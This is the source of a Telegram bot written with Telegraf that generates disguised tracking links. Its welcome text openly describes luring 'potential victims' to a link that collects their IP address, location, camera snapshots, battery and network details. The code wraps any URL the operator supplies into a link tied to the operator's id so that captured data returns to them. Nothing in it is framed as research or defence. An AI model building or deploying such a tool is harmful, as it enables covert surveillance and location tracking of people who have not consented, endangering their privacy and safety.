const { Telegraf, Markup } = require("telegraf");

const bot = new Telegraf(process.env.BOT_TOKEN);

bot.start((ctx) =>
  ctx.reply(
    "You can use this bot to track any persons device just through a simple link. It can gather information like IP address, location and camera snaps, battery level, network info and a wide range of information about their device, plus many more benefits.\n\nNow you create a URL. click on the create link given below. You can now enter any URL in Create Link that will be used to lure potential victims. once you provide the URL to the bot, the bot will send you two links which can be used to track individuals.\n\nIf You Can Track Bot is not working. then you click on the [ RUN ] button. or any other problems or for any updates. given below click on Join button.",
    Markup.inlineKeyboard([
      Markup.button.callback("Create Link", "createLink"),
      Markup.button.url("Join Channel", "https://t.me/yourchannel"),
    ])
  )
);

bot.action("createLink", (ctx) => {
  ctx.reply("Send your URL 🌐...", {
    reply_markup: {
      force_reply: true,
    },
  });
});

bot.on("text", async (ctx) => {
  if (
    ctx.message.reply_to_message &&
    ctx.message.reply_to_message.text == "Send your URL 🌐..."
  ) {
    const url = ctx.message.text;

    if (/^(http:\/\/|https:\/\/)/.test(url)) {
      const HOST = process.env.BASE_URL;
      const u =
        HOST + "/u/" + btoa(url) + "/" + ctx.message.from.id.toString(36);
      ctx.reply(
        `New links have been created successfully. You can use any one of the below links.\n\n✅Here Your Links\n\n${u}\n${u}`,
        Markup.inlineKeyboard([
          Markup.button.callback("Create New Link", "createLink"),
        ])
      );
    } else {
      ctx.reply("️ Please Enter a valid URL , including http or https.");
    }
  }
});


module.exports =bot